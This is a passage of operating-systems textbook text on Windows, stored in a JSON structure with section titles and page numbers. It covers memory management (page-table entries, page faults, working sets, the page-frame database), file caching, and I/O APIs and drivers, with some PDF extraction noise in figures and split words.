passes this to the memory-manager part\r\nof the executive. The memory manager then checks the access for validity. If the\r\nfaulted page falls within a committed region, it looks up the address in the list of\r\nVADs and finds (or creates) the process page-table entry. In the case of a shared\r\npage, the memory manager uses the prototype page-table entry associated with the\r\nsection object to fill in the new page-table entry for the process page table.\r\nThe format of the page-table entries differs depending on the processor archi\u0002tecture. For the x86 and x64, the entries for a mapped page are shown in\r\nFig. 11-31. If an entry is marked valid, its contents are interpreted by the hardware\r\nso that the virtual address can be translated into the correct physical page. Unmap\u0002ped pages also have entries, but they are marked invalid and the hardware ignores\r\nthe rest of the entry. The software format is somewhat different from the hardware\nSEC. 11.5 MEMORY MANAGEMENT 935\r\nformat and is determined by the memory manager. For example, for an unmapped\r\npage that must be allocated and zeroed before it may be used, that fact is noted in\r\nthe page-table entry.\r\nN\r\nX\r\n63\r\nAVL Physical\r\npage number\r\n62 52 51 12\r\nAVL\r\n11 9\r\nG\r\n8\r\nP\r\nA\r\nT\r\n7\r\nD\r\n6\r\nA\r\n5\r\nP\r\nC\r\nD\r\n4\r\nP\r\nW\r\nT\r\n3\r\nU\r\n/\r\nS\r\n2\r\nR\r\n/\r\nW\r\n1\r\nP\r\n0\r\nNX No eXecute\r\nAVL AVaiLable to the OS\r\nG Global page\r\nPAT Page Attribute Table\r\nD Dirty (modified)\r\nA Accessed (referenced)\r\nPCD Page Cache Disable\r\nPWT Page Write-Through\r\nU/S User/Supervisor\r\nR/W Read/Write access\r\nP Present (valid)\r\nFigure 11-31. A page-table entry (PTE) for a mapped page on the Intel x86 and\r\nAMD x64 architectures.\r\nTw o important bits in the page-table entry are updated by the hardware direct\u0002ly. These are the access (A) and dirty (D) bits. These bits keep track of when a\r\nparticular page mapping has been used to access the page and whether that access\r\ncould have modified the page by writing it. This really helps the performance of\r\nthe system because the memory manager can use the access bit to implement the\r\nLRU (Least-Recently Used) style of paging. The LRU principle says that pages\r\nwhich have not been used the longest are the least likely to be used again soon.\r\nThe access bit allows the memory manager to determine that a page has been ac\u0002cessed. The dirty bit lets the memory manager know that a page may have been\r\nmodified, or more significantly, that a page has not been modified. If a page has\r\nnot been modified since being read from disk, the memory manager does not have\r\nto write the contents of the page to disk before using it for something else.\r\nBoth the x86 and x64 use a 64-bit page-table entry, as shown in Fig. 11-31.\r\nEach page fault can be considered as being in one of fiv e categories:\r\n1. The page referenced is not committed.\r\n2. Access to a page has been attempted in violation of the permissions.\r\n3. A shared copy-on-write page was about to be modified.\r\n4. The stack needs to grow.\r\n5. The page referenced is committed but not currently mapped in.\r\nThe first and second cases are due to programming errors. If a program at\u0002tempts to use an address which is not supposed to have a valid mapping, or at\u0002tempts an invalid operation (like attempting to write a read-only page) this is called\n936 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nan access violation and usually results in termination of the process. Access viola\u0002tions are often the result of bad pointers, including accessing memory that was\r\nfreed and unmapped from the process.\r\nThe third case has the same symptoms as the second one (an attempt to write\r\nto a read-only page), but the treatment is different. Because the page has been\r\nmarked as copy-on-write, the memory manager does not report an access violation,\r\nbut instead makes a private copy of the page for the current process and then re\u0002turns control to the thread that attempted to write the page. The thread will retry\r\nthe write, which will now complete without causing a fault.\r\nThe fourth case occurs when a thread pushes a value onto its stack and crosses\r\nonto a page which has not been allocated yet. The memory manager is program\u0002med to recognize this as a special case. As long as there is still room in the virtual\r\npages reserved for the stack, the memory manager will supply a new physical page,\r\nzero it, and map it into the process. When the thread resumes running, it will retry\r\nthe access and succeed this time around.\r\nFinally, the fifth case is a normal page fault. However, it has several subcases.\r\nIf the page is mapped by a file, the memory manager must search its data struc\u0002tures, such as the prototype page table associated with the section object to be sure\r\nthat there is not already a copy in memory. If there is, say in another process or on\r\nthe standby or modified page lists, it will just share it—perhaps marking it as copy\u0002on-write if changes are not supposed to be shared. If there is not already a copy,\r\nthe memory manager will allocate a free physical page and arrange for the file\r\npage to be copied in from disk, unless another the page is already transitioning in\r\nfrom disk, in which case it is only necessary to wait for the transition to complete.\r\nWhen the memory manager can satisfy a page fault by finding the needed page\r\nin memory rather than reading it in from disk, the fault is classified as a soft fault.\r\nIf the copy from disk is needed, it is a hard fault. Soft faults are much cheaper,\r\nand have little impact on application performance compared to hard faults. Soft\r\nfaults can occur because a shared page has already been mapped into another proc\u0002ess, or only a new zero page is needed, or the needed page was trimmed from the\r\nprocess’ working set but is being requested again before it has had a chance to be\r\nreused. Soft faults can also occur because pages have been compressed to ef\u0002fectively increase the size of physical memory. For most configurations of CPU,\r\nmemory, and I/O in current systems it is more efficient to use compression rather\r\nthan incur the I/O expense (performance and energy) required to read a page from\r\ndisk.\r\nWhen a physical page is no longer mapped by the page table in any process it\r\ngoes onto one of three lists: free, modified, or standby. Pages that will never be\r\nneeded again, such as stack pages of a terminating process, are freed immediately.\r\nPages that may be faulted again go to either the modified list or the standby list,\r\ndepending on whether or not the dirty bit was set for any of the page-table entries\r\nthat mapped the page since it was last read from disk. Pages in the modified list\r\nwill be eventually written to disk, then moved to the standby list.\nSEC. 11.5 MEMORY MANAGEMENT 937\r\nThe memory manager can allocate pages as needed using either the free list or\r\nthe standby list. Before allocating a page and copying it in from disk, the memory\r\nmanager always checks the standby and modified lists to see if it already has the\r\npage in memory. The prepaging scheme in Windows thus converts future hard\r\nfaults into soft faults by reading in the pages that are expected to be needed and\r\npushing them onto the standby list. The memory manager itself does a small\r\namount of ordinary prepaging by accessing groups of consecutive pages rather than\r\nsingle pages. The additional pages are immediately put on the standby list. This is\r\nnot generally wasteful because the overhead in the memory manager is very much\r\ndominated by the cost of doing a single I/O. Reading a cluster of pages rather than\r\na single page is negligibly more expensive.\r\nThe page-table entries in Fig. 11-31 refer to physical page numbers, not virtual\r\npage numbers. To update page-table (and page-directory) entries, the kernel needs\r\nto use virtual addresses. Windows maps the page tables and page directories for\r\nthe current process into kernel virtual address space using self-map entries in the\r\npage directory, as shown in Fig. 11-32. By making page-directory entries point at\r\nthe page directory (the self-map), there are virtual addresses that can be used to\r\nrefer to page-directory entries (a) as well as page table entries (b). The self-map\r\noccupies the same 8 MB of kernel virtual addresses for every process (on the x86).\r\nFor simplicity the figure shows the x86 self-map for 32-bit PTEs (Page-Table\r\nEntries). Windows actually uses 64-bit PTEs so the system can makes use of\r\nmore than 4 GB of physical memory. With 32-bit PTEs, the self-map uses only\r\none PDE (Page-Directory Entry) in the page directory, and thus occupies only 4\r\nMB of addresses rather than 8 MB.\r\nThe Page Replacement Algorithm\r\nWhen the number of free physical memory pages starts to get low, the memory\r\nmanager starts working to make more physical pages available by removing them\r\nfrom user-mode processes as well as the system process, which represents kernel\u0002mode use of pages. The goal is to have the most important virtual pages present in\r\nmemory and the others on disk. The trick is in determining what important means.\r\nIn Windows this is answered by making heavy use of the working-set concept.\r\nEach process (not each thread) has a working set. This set consists of the map\u0002ped-in pages that are in memory and thus can be referenced without a page fault.\r\nThe size and composition of the working set fluctuates as the process’ threads run,\r\nof course.\r\nEach process’ working set is described by two parameters: the minimum size\r\nand the maximum size. These are not hard bounds, so a process may have fewer\r\npages in memory than its minimum or (under certain circumstances) more than its\r\nmaximum. Every process starts with the same minimum and maximum, but these\r\nbounds can change over time, or can be determined by the job object for processes\r\ncontained in a job. The default initial minimum is in the range 20–50 pages and\n938 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nCR3\r\nPD\r\n0x300\r\nSelf-map: PD[0xc0300000>>22] is PD (page-directory)\r\nVirtual address (a): (PTE *)(0xc0300c00) points to PD[0x300] which is the self-map page directory entry\r\nVirtual address (b): (PTE *)(0xc0390c84) points to PTE for virtual address 0xe4321000\r\n(a)\r\n1100 0000 00 11 1001 0000 1100 1000 01 00 Virtual\r\naddress\r\nc0390c84\r\n1100 0000 00 11 0000 0000 1100 0000 00 00 Virtual\r\naddress\r\nc0300c00\r\nCR3\r\nPD\r\n0x300\r\n0x390\r\nPT\r\n0x321\r\n(b)\r\nFigure 11-32. The Windows self-map entries are used to map the physical pages\r\nof the page tables and page directory into kernel virtual addresses (shown for\r\n32-bit PTEs).\r\nthe default initial maximum is in the range 45–345 pages, depending on the total\r\namount of physical memory in the system. The system administrator can change\r\nthese defaults, however. While few home users will try, server admins might.\r\nWorking sets come into play only when the available physical memory is get\u0002ting low in the system. Otherwise processes are allowed to consume memory as\r\nthey choose, often far exceeding the working-set maximum. But when the system\r\ncomes under memory pressure, the memory manager starts to squeeze processes\r\nback into their working sets, starting with processes that are over their maximum\r\nby the most. There are three levels of activity by the working-set manager, all of\r\nwhich is periodic based on a timer. New activity is added at each level:\r\n1. Lots of memory available: Scan pages resetting access bits and\r\nusing their values to represent the age of each page. Keep an estimate\r\nof the unused pages in each working set.\r\n2. Memory getting tight: For any process with a significant proportion\r\nof unused pages, stop adding pages to the working set and start\r\nreplacing the oldest pages whenever a new page is needed. The re\u0002placed pages go to the standby or modified list.\r\n3. Memory is tight: Trim (i.e., reduce) working sets to be below their\r\nmaximum by removing the oldest pages.\nSEC. 11.5 MEMORY MANAGEMENT 939\r\nThe working set manager runs every second, called from the balance set man\u0002ager thread. The working-set manager throttles the amount of work it does to keep\r\nfrom overloading the system. It also monitors the writing of pages on the modified\r\nlist to disk to be sure that the list does not grow too large, waking the Modified\u0002PageWr iter thread as needed.\r\nPhysical Memory Management\r\nAbove we mentioned three different lists of physical pages, the free list, the\r\nstandby list, and the modified list. There is a fourth list which contains free pages\r\nthat have been zeroed. The system frequently needs pages that contain all zeros.\r\nWhen new pages are given to processes, or the final partial page at the end of a file\r\nis read, a zero page is needed. It is time consuming to write a page with zeros, so\r\nit is better to create zero pages in the background using a low-priority thread.\r\nThere is also a fifth list used to hold pages that have been detected as having hard\u0002ware errors (i.e., through hardware error detection).\r\nAll pages in the system either are referenced by a valid page-table entry or are\r\non one of these fiv e lists, which are collectively called the PFN database (Page\r\nFrame Number database). Fig. 11-33 shows the structure of the PFN Database.\r\nThe table is indexed by physical page-frame number. The entries are fixed length,\r\nbut different formats are used for different kinds of entries (e.g., shared vs. private).\r\nValid entries maintain the page’s state and a count of how many page tables point\r\nto the page, so that the system can tell when the page is no longer in use. Pages\r\nthat are in a working set tell which entry references them. There is also a pointer\r\nto the process page table that points to the page (for nonshared pages) or to the\r\nprototype page table (for shared pages).\r\nAdditionally there is a link to the next page on the list (if any), and various\r\nother fields and flags, such as read in progress, write in progress, and so on. To\r\nsave space, the lists are linked together with fields referring to the next element by\r\nits index within the table rather than pointers. The table entries for the physical\r\npages are also used to summarize the dirty bits found in the various page table en\u0002tries that point to the physical page (i.e., because of shared pages). There is also\r\ninformation used to represent differences in memory pages on larger server sys\u0002tems which have memory that is faster from some processors than from others,\r\nnamely NUMA machines.\r\nPages are moved between the working sets and the various lists by the work\u0002ing-set manager and other system threads. Let us examine the transitions. When\r\nthe working-set manager removes a page from a working set, the page goes on the\r\nbottom of the standby or modified list, depending on its state of cleanliness. This\r\ntransition is shown as (1) in Fig. 11-34.\r\nPages on both lists are still valid pages, so if a page fault occurs and one of\r\nthese pages is needed, it is removed from the list and faulted back into the working\r\nset without any disk I/O (2). When a process exits, its nonshared pages cannot be\n940 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nX\r\nX\r\nX\r\nX\r\nState Cnt WS PT Other Next\r\nClean\r\nDirty\r\nClean\r\nActive\r\nClean\r\nDirty\r\nActive\r\nDirty\r\nFree\r\nFree\r\nZeroed\r\nActive\r\nActive\r\nZeroed\r\n13\r\n12\r\n11 20\r\n10\r\n8 4\r\n7\r\n6\r\n5\r\n4\r\n3 6\r\n2\r\n1 14\r\n0\r\n14\r\nStandby\r\nModified\r\nFree\r\nZeroed\r\nPage tables Page-frame number database\r\nZeroed\r\nList headers\r\n9\r\nFigure 11-33. Some of the major fields in the page-frame database for a valid\r\npage.\r\nfaulted back to it, so the valid pages in its page table and any of its pages on the\r\nmodified or standby lists go on the free list (3). Any pagefile space in use by the\r\nprocess is also freed.\r\nWorking\r\nSets\r\nModified\r\npage\r\nlist\r\nStandby\r\npage\r\nlist\r\nFree\r\npage\r\nlist\r\nZeroed\r\npage\r\nlist\r\nBad memory\r\npage\r\nlist\r\nModified\r\npage\r\nwriter\r\n(4)\r\nDealloc\r\n(5)\r\nZero\r\npage\r\nthread\r\n(7)\r\nPage evicted from all working sets (1) Process exit (3)\r\nSoft page fault (2)\r\nZero page needed (8)\r\nPage referenced (6)\r\nFigure 11-34. The various page lists and the transitions between them.\r\nOther transitions are caused by other system threads. Every 4 seconds the bal\u0002ance set manager thread runs and looks for processes all of whose threads have\r\nbeen idle for a certain number of seconds. If it finds any such processes, their\nSEC. 11.5 MEMORY MANAGEMENT 941\r\nkernel stacks are unpinned from physical memory and their pages are moved to the\r\nstandby or modified lists, also shown as (1).\r\nTw o other system threads, the mapped page writer and the modified page\r\nwriter, wake up periodically to see if there are enough clean pages. If not, they\r\ntake pages from the top of the modified list, write them back to disk, and then\r\nmove them to the standby list (4). The former handles writes to mapped files and\r\nthe latter handles writes to the pagefiles. The result of these writes is to transform\r\nmodified (dirty) pages into standby (clean) pages.\r\nThe reason for having two threads is that a mapped file might have to grow as\r\na result of the write, and growing it requires access to on-disk data structures to al\u0002locate a free disk block. If there is no room in memory to bring them in when a\r\npage has to be written, a deadlock could result. The other thread can solve the\r\nproblem by writing out pages to a paging file.\r\nThe other transitions in Fig. 11-34 are as follows. If a process unmaps a page,\r\nthe page is no longer associated with a process and can go on the free list (5), ex\u0002cept for the case that it is shared. When a page fault requires a page frame to hold\r\nthe page about to be read in, the page frame is taken from the free list (6), if pos\u0002sible. It does not matter that the page may still contain confidential information\r\nbecause it is about to be overwritten in its entirety.\r\nThe situation is different when a stack grows. In that case, an empty page\r\nframe is needed and the security rules require the page to contain all zeros. For\r\nthis reason, another kernel system thread, the ZeroPage thread, runs at the lowest\r\npriority (see Fig. 11-26), erasing pages that are on the free list and putting them on\r\nthe zeroed page list (7). Whenever the CPU is idle and there are free pages, they\r\nmight as well be zeroed since a zeroed page is potentially more useful than a free\r\npage and it costs nothing to zero the page when the CPU is idle.\r\nThe existence of all these lists leads to some subtle policy choices. For ex\u0002ample, suppose that a page has to be brought in from disk and the free list is empty.\r\nThe system is now forced to choose between taking a clean page from the standby\r\nlist (which might otherwise have been faulted back in later) or an empty page from\r\nthe zeroed page list (throwing away the work done in zeroing it). Which is better?\r\nThe memory manager has to decide how aggressively the system threads\r\nshould move pages from the modified list to the standby list. Having clean pages\r\naround is better than having dirty pages around (since clean ones can be reused in\u0002stantly), but an aggressive cleaning policy means more disk I/O and there is some\r\nchance that a newly cleaned page may be faulted back into a working set and dirt\u0002ied again anyway. In general, Windows resolves these kinds of trade-offs through\r\nalgorithms, heuristics, guesswork, historical precedent, rules of thumb, and\r\nadministrator-controlled parameter settings.\r\nModern Windows introduced an additional abstraction layer at the bottom of\r\nthe memory manager, called the store manager. This layer makes decisions about\r\nhow to optimize the I/O operations to the available backing stores. Persistent stor\u0002age systems include auxiliary flash memory and SSDs in addition to rotating disks.\n942 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nThe store manager optimizes where and how physical memory pages are backed\r\nby the persistent stores in the system. It also implements optimization techniques\r\nsuch as copy-on-write sharing of identical physical pages and compression of the\r\npages in the standby list to effectively increase the available RAM.\r\nAnother change in memory management in Modern Windows is the introduc\u0002tion of a swap file. Historically memory management in Windows has been based\r\non working sets, as described above. As memory pressure increases, the memory\r\nmanager squeezes on the working sets to reduce the footprint each process has in\r\nmemory. The modern application model introduces opportunities for new eff icien\u0002cies. Since the process containing the foreground part of a modern application is\r\nno longer given processor resources once the user has switched away, there is no\r\nneed for its pages to be resident. As memory pressure builds in the system, the\r\npages in the process may be removed as part of normal working-set management.\r\nHowever, the process lifetime manager knows how long it has been since the user\r\nswitched to the application’s foreground process. When more memory is needed it\r\npicks a process that has not run in a while and calls into the memory manager to\r\nefficiently swap all the pages in a small number of I/O operations. The pages will\r\nbe written to the swap file by aggregating them into one or more large chunks.\r\nThis means that the entire process can also be restored in memory with fewer I/O\r\noperations.\r\nAll in all, memory management is a highly complex executive component with\r\nmany data structures, algorithms, and heuristics. It attempts to be largely self tun\u0002ing, but there are also many knobs that administrators can tweak to affect system\r\nperformance. A number of these knobs and the associated counters can be viewed\r\nusing tools in the various tool kits mentioned earlier. Probably the most important\r\nthing to remember here is that memory management in real systems is a lot more\r\nthan just one simple paging algorithm like clock or aging."
          }
        }
      },
      "11.6 CACHING IN WINDOWS": {
        "page": 973,
        "content": "11.6 CACHING IN WINDOWS\r\nThe Windows cache improves the performance of file systems by keeping\r\nrecently and frequently used regions of files in memory. Rather than cache physi\u0002cal addressed blocks from the disk, the cache manager manages virtually addressed\r\nblocks, that is, regions of files. This approach fits well with the structure of the\r\nnative NT File System (NTFS), as we will see in Sec. 11.8. NTFS stores all of its\r\ndata as files, including the file-system metadata.\r\nThe cached regions of files are called views because they represent regions of\r\nkernel virtual addresses that are mapped onto file-system files. Thus, the actual\r\nmanagement of the physical memory in the cache is provided by the memory man\u0002ager. The role of the cache manager is to manage the use of kernel virtual ad\u0002dresses for views, arrange with the memory manager to pin pages in physical\r\nmemory, and provide interfaces for the file systems.\nSEC. 11.6 CACHING IN WINDOWS 943\r\nThe Windows cache-manager facilities are shared among all the file systems.\r\nBecause the cache is virtually addressed according to individual files, the cache\r\nmanager is easily able to perform read-ahead on a per-file basis. Requests to ac\u0002cess cached data come from each file system. Virtual caching is convenient be\u0002cause the file systems do not have to first translate file offsets into physical block\r\nnumbers before requesting a cached file page. Instead, the translation happens\r\nlater when the memory manager calls the file system to access the page on disk.\r\nBesides management of the kernel virtual address and physical memory re\u0002sources used for caching, the cache manager also has to coordinate with file sys\u0002tems regarding issues like coherency of views, flushing to disk, and correct mainte\u0002nance of the end-of-file marks—particularly as files expand. One of the most dif\u0002ficult aspects of a file to manage between the file system, the cache manager, and\r\nthe memory manager is the offset of the last byte in the file, called the ValidData\u0002Length. If a program writes past the end of the file, the blocks that were skipped\r\nhave to be filled with zeros, and for security reasons it is critical that the Valid\u0002DataLength recorded in the file metadata not allow access to uninitialized blocks,\r\nso the zero blocks have to be written to disk before the metadata is updated with\r\nthe new length. While it is expected that if the system crashes, some of the blocks\r\nin the file might not have been updated from memory, it is not acceptable that some\r\nof the blocks might contain data previously belonging to other files.\r\nLet us now examine how the cache manager works. When a file is referenced,\r\nthe cache manager maps a 256-KB chunk of kernel virtual address space onto the\r\nfile. If the file is larger than 256 KB, only a portion of the file is mapped at a time.\r\nIf the cache manager runs out of 256-KB chunks of virtual address space, it must\r\nunmap an old file before mapping in a new one. Once a file is mapped, the cache\r\nmanager can satisfy requests for its blocks by just copying from kernel virtual ad\u0002dress space to the user buffer. If the block to be copied is not in physical memory,\r\na page fault will occur and the memory manager will satisfy the fault in the usual\r\nway. The cache manager is not even aware of whether the block was in memory or\r\nnot. The copy always succeeds.\r\nThe cache manager also works for pages that are mapped into virtual memory\r\nand accessed with pointers rather than being copied between kernel and user-mode\r\nbuffers. When a thread accesses a virtual address mapped to a file and a page fault\r\noccurs, the memory manager may in many cases be able to satisfy the access as a\r\nsoft fault. It does not need to access the disk, since it finds that the page is already\r\nin physical memory because it is mapped by the cache manager."
      },
      "11.7 INPUT/OUTPUT IN WINDOWS": {
        "page": 974,
        "children": {
          "11.7.1 Fundamental Concepts": {
            "page": 975,
            "content": "11.7.1 Fundamental Concepts\r\nThe I/O manager is on intimate terms with the plug-and-play manager. The\r\nbasic idea behind plug and play is that of an enumerable bus. Many buses, includ\u0002ing PC Card, PCI, PCIe, AGP, USB, IEEE 1394, EIDE, SCSI, and SATA, hav e\r\nbeen designed so that the plug-and-play manager can send a request to each slot\r\nand ask the device there to identify itself. Having discovered what is out there, the\r\nplug-and-play manager allocates hardware resources, such as interrupt levels,\r\nlocates the appropriate drivers, and loads them into memory. As each driver is\r\nloaded, a driver object is created for it. And then for each device, at least one de\u0002vice object is allocated. For some buses, such as SCSI, enumeration happens only\r\nat boot time, but for other buses, such as USB, it can happen at any time, requiring\r\nclose cooperation between the plug-and-play manager, the bus drivers (which ac\u0002tually do the enumerating), and the I/O manager.\r\nIn Windows, all the file systems, antivirus filters, volume managers, network\r\nprotocol stacks, and even kernel services that have no associated hardware are im\u0002plemented using I/O drivers. The system configuration must be set to cause some\r\nof these drivers to load, because there is no associated device to enumerate on the\r\nbus. Others, like the file systems, are loaded by special code that detects they are\r\nneeded, such as the file-system recognizer that looks at a raw volume and deci\u0002phers what type of file system format it contains.\r\nAn interesting feature of Windows is its support for dynamic disks. These\r\ndisks may span multiple partitions and even multiple disks and may be reconfig\u0002ured on the fly, without even having to reboot. In this way, logical volumes are no\r\nlonger constrained to a single partition or even a single disk so that a single file\r\nsystem may span multiple drives in a transparent way.\r\nThe I/O to volumes can be filtered by a special Windows driver to produce\r\nVolume Shadow Copies. The filter driver creates a snapshot of the volume which\r\ncan be separately mounted and represents a volume at a previous point in time. It\r\ndoes this by keeping track of changes after the snapshot point. This is very con\u0002venient for recovering files that were accidentally deleted, or traveling back in time\r\nto see the state of a file at periodic snapshots made in the past.\r\nBut shadow copies are also valuable for making accurate backups of server\r\nsystems. The operating system works with server applications to have them reach\nSEC. 11.7 INPUT/OUTPUT IN WINDOWS 945\r\na convenient point for making a clean backup of their persistent state on the vol\u0002ume. Once all the applications are ready, the system initializes the snapshot of the\r\nvolume and then tells the applications that they can continue. The backup is made\r\nof the volume state at the point of the snapshot. And the applications were only\r\nblocked for a very short time rather than having to go offline for the duration of the\r\nbackup.\r\nApplications participate in the snapshot process, so the backup reflects a state\r\nthat is easy to recover in case there is a future failure. Otherwise the backup might\r\nstill be useful, but the state it captured would look more like the state if the system\r\nhad crashed. Recovering from a system at the point of a crash can be more dif\u0002ficult or even impossible, since crashes occur at arbitrary times in the execution of\r\nthe application. Murphy’s Law says that crashes are most likely to occur at the\r\nworst possible time, that is, when the application data is in a state where recovery\r\nis impossible.\r\nAnother aspect of Windows is its support for asynchronous I/O. It is possible\r\nfor a thread to start an I/O operation and then continue executing in parallel with\r\nthe I/O. This feature is especially important on servers. There are various ways\r\nthe thread can find out that the I/O has completed. One is to specify an event ob\u0002ject at the time the call is made and then wait on it eventually. Another is to speci\u0002fy a queue to which a completion event will be posted by the system when the I/O\r\nis done. A third is to provide a callback procedure that the system calls when the\r\nI/O has completed. A fourth is to poll a location in memory that the I/O manager\r\nupdates when the I/O completes.\r\nThe final aspect that we will mention is prioritized I/O. I/O priority is deter\u0002mined by the priority of the issuing thread, or it can be explicitly set. There are\r\nfive priorities specified: critical, high, normal, low, and very low. Critical is re\u0002served for the memory manager to avoid deadlocks that could otherwise occur\r\nwhen the system experiences extreme memory pressure. Low and very low priori\u0002ties are used by background processes, like the disk defragmentation service and\r\nspyware scanners and desktop search, which are attempting to avoid interfering\r\nwith normal operations of the system. Most I/O gets normal priority, but multi\u0002media applications can mark their I/O as high to avoid glitches. Multimedia appli\u0002cations can alternatively use bandwidth reservation to request guaranteed band\u0002width to access time-critical files, like music or video. The I/O system will pro\u0002vide the application with the optimal transfer size and the number of outstanding\r\nI/O operations that should be maintained to allow the I/O system to achieve the re\u0002quested bandwidth guarantee."
          },
          "11.7.2 Input/Output API Calls": {
            "page": 976,
            "content": "11.7.2 Input/Output API Calls\r\nThe system call APIs provided by the I/O manager are not very different from\r\nthose offered by most other operating systems. The basic operations are open,\r\nread, wr ite, ioctl, and close, but there are also plug-and-play and power operations,\n946 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\noperations for setting parameters, as well as calls for flushing system buffers, and\r\nso on. At the Win32 layer these APIs are wrapped by interfaces that provide high\u0002er-level operations specific to particular devices. At the bottom, though, these\r\nwrappers open devices and perform these basic types of operations. Even some\r\nmetadata operations, such as file rename, are implemented without specific system\r\ncalls. They just use a special version of the ioctl operations. This will make more\r\nsense when we explain the implementation of I/O device stacks and the use of\r\nIRPs by the I/O manager.\r\nI/O system call Description\r\nNtCreateFile Open new or existing files or devices\r\nNtReadFile Read from a file or device\r\nNtWr iteFile Wr ite to a file or device\r\nNtQuer yDirector yFile Request infor mation about a directory, including files\r\nNtQuer yVolumeInfor mationFile Request infor mation about a volume\r\nNtSetVolumeInfor mationFile Modify volume infor mation\r\nNtNotifyChangeDirector yFile Complete when any file in the directory or subtree is modified\r\nNtQuer yInfor mationFile Request infor mation about a file\r\nNtSetInfor mationFile Modify file infor mation\r\nNtLockFile Lock a range of bytes in a file\r\nNtUnlockFile Remove a range lock\r\nNtFsControlFile Miscellaneous operations on a file\r\nNtFlushBuffersFile Flush in-memor y file buffers to disk\r\nNtCancelIoFile Cancel outstanding I/O operations on a file\r\nNtDeviceIoControlFile Special operations on a device\r\nFigure 11-35. Native NT API calls for performing I/O.\r\nThe native NT I/O system calls, in keeping with the general philosophy of\r\nWindows, take numerous parameters, and include many variations. Figure 11-35\r\nlists the primary system-call interfaces to the I/O manager. NtCreateFile is used to\r\nopen existing or new files. It provides security descriptors for new files, a rich de\u0002scription of the access rights requested, and gives the creator of new files some\r\ncontrol over how blocks will be allocated. NtReadFile and NtWr iteFile take a file\r\nhandle, buffer, and length. They also take an explicit file offset, and allow a key to\r\nbe specified for accessing locked ranges of bytes in the file. Most of the parame\u0002ters are related to specifying which of the different methods to use for reporting\r\ncompletion of the (possibly asynchronous) I/O, as described above.\r\nNtQuer yDirector yFile is an example of a standard paradigm in the executive\r\nwhere various Query APIs exist to access or modify information about specific\r\ntypes of objects. In this case, it is file objects that refer to directories. A parameter\r\nspecifies what type of information is being requested, such as a list of the names in\nSEC. 11.7 INPUT/OUTPUT IN WINDOWS 947\r\nthe directory or detailed information about each file that is needed for an extended\r\ndirectory listing. Since this is really an I/O operation, all the standard ways of\r\nreporting that the I/O completed are supported. NtQuer yVolumeInfor mationFile is\r\nlike the directory query operation, but expects a file handle which represents an\r\nopen volume which may or may not contain a file system. Unlike for directories,\r\nthere are parameters than can be modified on volumes, and thus there is a separate\r\nAPI NtSetVolumeInfor mationFile.\r\nNtNotifyChangeDirector yFile is an example of an interesting NT paradigm.\r\nThreads can do I/O to determine whether any changes occur to objects (mainly\r\nfile-system directories, as in this case, or registry keys). Because the I/O is asyn\u0002chronous the thread returns and continues, and is only notified later when some\u0002thing is modified. The pending request is queued in the file system as an outstand\u0002ing I/O operation using an I/O Request Packet. Notifications are problematic if\r\nyou want to remove a file-system volume from the system, because the I/O opera\u0002tions are pending. So Windows supports facilities for canceling pending I/O oper\u0002ations, including support in the file system for forcibly dismounting a volume with\r\npending I/O.\r\nNtQuer yInfor mationFile is the file-specific version of the system call for direc\u0002tories. It has a companion system call, NtSetInfor mationFile. These interfaces ac\u0002cess and modify all sorts of information about file names, file features like en\u0002cryption and compression and sparseness, and other file attributes and details, in\u0002cluding looking up the internal file id or assigning a unique binary name (object id)\r\nto a file.\r\nThese system calls are essentially a form of ioctl specific to files. The set oper\u0002ation can be used to rename or delete a file. But note that they take handles, not\r\nfile names, so a file first must be opened before being renamed or deleted. They\r\ncan also be used to rename the alternative data streams on NTFS (see Sec. 11.8).\r\nSeparate APIs, NtLockFile and NtUnlockFile, exist to set and remove byte\u0002range locks on files. NtCreateFile allows access to an entire file to be restricted by\r\nusing a sharing mode. An alternative is these lock APIs, which apply mandatory\r\naccess restrictions to a range of bytes in the file. Reads and writes must supply a\r\nkey matching the key provided to NtLockFile in order to operate on the locked\r\nranges.\r\nSimilar facilities exist in UNIX, but there it is discretionary whether applica\u0002tions heed the range locks. NtFsControlFile is much like the preceding Query and\r\nSet operations, but is a more generic operation aimed at handling file-specific oper\u0002ations that do not fit within the other APIs. For example, some operations are spe\u0002cific to a particular file system.\r\nFinally, there are miscellaneous calls such as NtFlushBuffersFile. Like the\r\nUNIX sync call, it forces file-system data to be written back to disk. NtCancel\u0002IoFile cancels outstanding I/O requests for a particular file, and NtDeviceIoCon\u0002trolFile implements ioctl operations for devices. The list of operations is actually\r\nmuch longer. There are system calls for deleting files by name, and for querying\n948 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nthe attributes of a specific file—but these are just wrappers around the other I/O\r\nmanager operations we have listed and did not really need to be implemented as\r\nseparate system calls. There are also system calls for dealing with I/O completion\r\nports, a queuing facility in Windows that helps multithreaded servers make ef\u0002ficient use of asynchronous I/O operations by readying threads by demand and\r\nreducing the number of context switches required to service I/O on dedicated\r\nthreads."
          },
          "11.7.3 Implementation of I/O": {
            "page": 979,
            "content": "11.7.3 Implementation of I/O\r\nThe Windows I/O system consists of the plug-and-play services, the device\r\npower manager, the I/O manager, and the device-driver model. Plug-and-play\r\ndetects changes in hardware configuration and builds or tears down the device\r\nstacks for each device, as well as causing the loading and unloading of device driv\u0002ers. The device power manager adjusts the power state of the I/O devices to reduce\r\nsystem power consumption when devices are not in use. The I/O manager pro\u0002vides support for manipulating I/O kernel objects, and IRP-based operations like\r\nIoCallDr ivers and IoCompleteRequest. But most of the work required to support\r\nWindows I/O is implemented by the device drivers themselves.\r\nDevice Drivers\r\nTo make sure that device drivers work well with the rest of Windows, Micro\u0002soft has defined the WDM (Windows Driver Model) that device drivers are ex\u0002pected to conform with. The WDK (Windows Driver Kit) contains docu\u0002mentation and examples to help developers produce drivers which conform to the\r\nWDM. Most Windows drivers start out as copies of an appropriate sample driver\r\nfrom the WDK, which is then modified by the driver writer.\r\nMicrosoft also provides a driver verifier which validates many of the actions\r\nof drivers to be sure that they conform to the WDM requirements for the structure\r\nand protocols for I/O requests, memory management, and so on. The verifier ships\r\nwith the system, and administrators can control it by running verifier.exe, which al\u0002lows them to configure which drivers are to be checked and how extensive (i.e., ex\u0002pensive) the checks should be.\r\nEven with all the support for driver dev elopment and verification, it is still very\r\ndifficult to write even simple drivers in Windows, so Microsoft has built a system\r\nof wrappers called the WDF (Windows Driver Foundation) that runs on top 